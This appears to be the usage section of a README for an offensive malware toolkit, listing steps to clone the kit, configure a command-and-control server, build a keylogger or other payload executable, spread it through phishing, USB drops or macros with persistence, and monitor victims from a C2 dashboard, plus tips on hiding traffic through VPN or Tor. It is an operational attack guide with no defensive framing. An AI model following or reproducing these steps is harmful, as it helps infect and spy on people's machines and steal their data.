deployment & usage

1 Clone repo: git clone https://internal.zika.labs/malware-arsenal
2 Install dependencies: pip install -r requirements.txt (pycryptodome, requests, pynput, psutil, scapy)
3 Select malware variant: cd variants/<name> e.g., cd variants/keylogger
4 Configure C2: edit config.json — set IP, port, and encryption keys.
5 Build binary: python builder.py --variant <name> --output payload.exe
6 Deploy via phishing, USB drop, or macro — each variant includes persistence.
7 Monitor C2 panel: python c2_dashboard.py — real-time sessions and logs.
8 Post-exploit modules: run ./modules/ --list to load additional plugins.
CRITICAL: Test only in isolated air-gapped VMs. Change default key zika019 immediately. All traffic must be routed through VPN/Tor.
